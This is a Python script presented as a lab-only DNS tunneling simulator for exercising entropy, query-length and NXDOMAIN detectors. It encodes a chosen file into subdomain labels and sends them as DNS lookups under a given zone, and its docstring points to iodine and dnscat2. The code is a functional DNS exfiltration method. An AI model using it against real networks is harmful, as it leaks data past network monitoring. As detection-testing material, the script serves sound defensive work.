#!/usr/bin/env python3
"""DNS tunneling simulator (lab-only).

Encodes a payload into a sequence of long, high-entropy subdomain labels under a zone you control
and resolves them, producing the long-label / high-entropy / NXDOMAIN-heavy pattern that the
entropy, query_len and nxdomain indicators detect. For maximum realism against a real controller,
use `iodine` or `dnscat2` instead; this scripted version needs no external daemon and is fully
lab-contained.

Usage: dns_tunnel_sim.py <zone> [payload_file] [chunk_len] [count]
  zone         DNS zone you control, e.g. tunnel.lab (queries will NXDOMAIN in an isolated lab)
  payload_file file to exfiltrate; if omitted, random bytes are used
  chunk_len    label length per query (default 30)
  count        max number of queries (default: all chunks)
"""
import base64
import os
import socket
import sys
import time


def encode_chunks(data: bytes, chunk_len: int) -> list[str]:
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    return [b32[i:i + chunk_len] for i in range(0, len(b32), chunk_len)] or ["0"]


def main(zone="tunnel.lab", payload_file=None, chunk_len=30, count=None):
    chunk_len = int(chunk_len)
    data = open(payload_file, "rb").read() if payload_file else os.urandom(800)
    chunks = encode_chunks(data, chunk_len)
    if count is not None:
        chunks = chunks[:int(count)]
    for i, c in enumerate(chunks):
        name = f"{c}.{i:04x}.{zone}"
        try:
            socket.gethostbyname(name)   # almost always NXDOMAIN in an isolated lab
        except Exception:
            pass
        time.sleep(0.05)
    print(f"dns_tunnel_sim: sent {len(chunks)} tunneled queries under .{zone}")


if __name__ == "__main__":
    a = sys.argv
    main(a[1] if len(a) > 1 else "tunnel.lab",
         a[2] if len(a) > 2 else None,
         a[3] if len(a) > 3 else 30,
         a[4] if len(a) > 4 else None)
